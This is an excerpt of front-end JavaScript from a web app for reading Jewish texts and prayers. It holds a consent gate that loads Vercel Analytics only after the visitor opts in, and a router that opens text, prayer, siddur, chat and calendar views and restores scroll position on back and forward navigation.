
        // Analytics consent gate. Vercel Web
        // Analytics is cookieless and stores no cross-site identifier, but
        // it's still gated behind explicit opt-in rather than loaded by
        // default, matching the consent-first stance the rest of the app takes
        // on non-essential scripts.
        const ANALYTICS_CONSENT_KEY = "Sh'elahAnalyticsConsent";

        function loadVercelAnalytics() {
            if (document.getElementById('vercelAnalyticsScript')) return;
            const script = document.createElement('script');
            script.id = 'vercelAnalyticsScript';
            script.src = '/_vercel/insights/script.js';
            script.defer = true;
            document.body.appendChild(script);
        }

        function initAnalyticsConsent() {
            const banner = document.getElementById('analyticsConsentBanner');
            if (!banner) return;
            const stored = localStorage.getItem(ANALYTICS_CONSENT_KEY);
            if (stored === 'granted' || stored === 'denied') {
                banner.classList.add('hidden');
                if (stored === 'granted') loadVercelAnalytics();
                return;
            }

            // Already on screen (it is part of the HTML); fades out on either
            // choice instead of vanishing in a single frame.
            banner.classList.remove('hidden');
            // Its height is the room the site footer leaves under its links
            // while it is up (index.html .site-footer), so it never covers them.
            const measureBanner = () => {
                const height = Math.ceil(banner.getBoundingClientRect().height);
                if (height > 0) document.documentElement.style.setProperty('--consent-banner-h', `${height}px`);
            };
            measureBanner();
            if (typeof ResizeObserver === 'function') new ResizeObserver(measureBanner).observe(banner);
            document.getElementById('analyticsConsentAccept')?.addEventListener('click', () => {
                localStorage.setItem(ANALYTICS_CONSENT_KEY, 'granted');
                dismissEl(banner, { preset: 'fade' });
                loadVercelAnalytics();
            });
            document.getElementById('analyticsConsentDecline')?.addEventListener('click', () => {
                localStorage.setItem(ANALYTICS_CONSENT_KEY, 'denied');
                dismissEl(banner, { preset: 'fade' });
            });
        }
        initAnalyticsConsent();

        // Single dispatcher driven by router.js: called once on initial page
        // load (isInitial: true, from main.js) and again on every
        // popstate (back/forward). `isInitial` suppresses the "no view key"
        // fallbacks (goHome / closing the calendar) on first load, since the
        // homepage/no-overlay state is already the default DOM state --
        // running them anyway would just be redundant, not incorrect.
        //
        // main.js makes the initial call as soon as the module runs, which is
        // BEFORE DOMContentLoaded -- i.e. before hydratePreferences() has
        // loaded the visitor's stored prefs. Opening a view that early renders
        // (and saves) the default prefs over the stored ones, so the initial
        // call is parked until hydratePreferences() finishes and replays it.
        // (preferencesHydrated / pendingInitialRoute are declared at the top of
        // this script so a throw anywhere above can't leave them in the TDZ.)

        // `direction` ("back" | "forward" | null): how a Back/Forward moved,
        // from the router; the view transition (swapView) goes that way.
        function routeOpensView(route) {
            return ['text', 'prayer', 'siddur', 'community', 'chat', 'a', 'history', 'date', 'conversation', 'auth']
                .some((key) => Boolean(route[key]));
        }

        function hydrateRoute(route, { isInitial = false, direction = null, saved = null, left = null } = {}) {
            route = route || {};
            if (isInitial && !preferencesHydrated) {
                pendingInitialRoute = route;
                return;
            }
            // A deep link builds its view from script: after the full stylesheet
            // has applied (the server-rendered first paint is already on screen).
            if (isInitial && window.ShelahStyles && !window.ShelahStyles.done && routeOpensView(route)) {
                void window.ShelahStyles.ready.then(() => hydrateRoute(route, { isInitial: true }));
                return;
            }
            // The views opened below swap synchronously, inside this call.
            _viewNavDirection = 'forward';
            if (isInitial) _viewNavDirection = null;
            else if (direction === 'back') _viewNavDirection = 'back';
            _viewScrollSaveOff = true;
            try {
                hydrateRouteViews(route, { isInitial, restoreScroll: saved?.viewScroll || null, left });
            } finally {
                _viewNavDirection = 'forward';
                _viewScrollSaveOff = false;
            }
        }

        // Back/Forward onto the page already on screen: put it back as it was
        // rather than blanking and refetching it.
        function restoreOnScreenRouteView(route, restoreScroll, left) {
            restoreShownView();
            // Back/Forward within one continuous text (the section named
            // still loaded): to where that entry was left. Opening or
            // closing an overlay (an answer, a conversation, a calendar
            // day) leaves the page under it as it is.
            const overlayMoved = ['chat', 'a', 'conversation', 'date', 'auth'].some((key) => (route[key] || null) !== (left?.[key] || null));
            if (route.text && left?.text && !overlayMoved) restoreViewScroll(restoreScroll, 'text');
            if (route.siddur && !overlayMoved) window.ShelahSiddur?.scrollTo(route.siddur);
        }

        // Opens the one page the route names (the first of text, prayer, siddur,
        // community, chat, answer, history); a route naming none goes home,
        // except on first load when home is already what is on screen.
        function openRouteView(route, isInitial, restoreScroll) {
            if (route.text) {
                // A link names the exact section to show: /text/Genesis.1 is
                // chapter 1, not a request to pick a chapter from the grid a
                // library click on "Genesis" opens.
                void readText(route.text, { fromRoute: true, skipNavigationGrid: true, restoreScroll });
            } else if (route.prayer) {
                void displayPrayer(route.prayer, { fromRoute: true, restoreScroll });
            } else if (route.siddur) {
                void displaySiddur(route.siddur, { fromRoute: true, restoreScroll });
            } else if (route.community) {
                void displayCommunity(route.community, { fromRoute: true, restoreScroll });
            } else if (route.chat) {
                void hydrateChatId(route.chat);
            } else if (route.a) {
                void hydratePublicAnswer(route.a);
            } else if (route.history) {
                displayAskHistoryPage({ fromRoute: true, query: route.q || '' });
            } else if (!isInitial) {
                void goHome({ fromRoute: true }).then(() => restoreViewScroll(restoreScroll, 'home'));
            }
        }

        function hydrateRouteViews(route, { isInitial, restoreScroll, left = null }) {
            // Display keys first, so a text/prayer opened below renders with
            // them instead of re-rendering afterwards.
            if (applyRouteDisplayPrefs(route)) {
                syncPrefsInputsFromState();
                applyReaderPreferences();
            }
            if (!isInitial && routeViewOnScreen(route)) {
                restoreOnScreenRouteView(route, restoreScroll, left);
            } else {
                openRouteView(route, isInitial, restoreScroll);
            }

            if (route.date) {
                hydrateCalendarDate(route.date);
            } else if (!isInitial) {
                window.closeCalendarModal?.();
            }

            // conversation/cv: static/js/conversation-ui.js opens, resizes or
            // closes the conversation panel to match (an answer's chat/a
            // keeps it on the answer hydrateChatId/hydratePublicAnswer show).
            window.ShelahConversationUI?.hydrate(route, { isInitial });

            // auth: the Clerk sign-in / profile modal over it all.
            syncAuthRoute(route);
        }
        window.hydrateRoute = hydrateRoute;
